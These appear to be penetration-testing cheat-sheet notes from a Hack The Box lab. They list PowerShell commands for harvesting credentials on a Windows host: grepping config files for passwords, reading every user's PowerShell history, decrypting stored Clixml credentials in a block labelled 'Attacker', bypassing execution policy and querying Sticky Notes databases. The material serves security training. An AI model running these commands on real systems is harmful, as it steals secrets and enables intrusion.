# Application Configuration Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

# Search PATH Files
```powershell
dir -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | select-string -NotMatch "svchost.exe" | select-string "exe"
```

# Dictionary Files
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

# Automation
```powershell
Get-ChildItem -Recurse -Include *.txt, *.ini, *.cfg, *.config, *.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object Path, LineNumber, Line | Out-GridView
```

# Powershell History
```powershell
(Get-PSReadLineOption).HistorySavePath
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history

gc (Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

# Powershell Credentials
```powershell
Admin:
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword

Attacker:
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

# Sticky Notes
```powershell
Set-ExecutionPolicy Bypass -Scope Process

C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Import-Module .\PSSQLite.psd1
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

strings plum.sqlite-wal
```
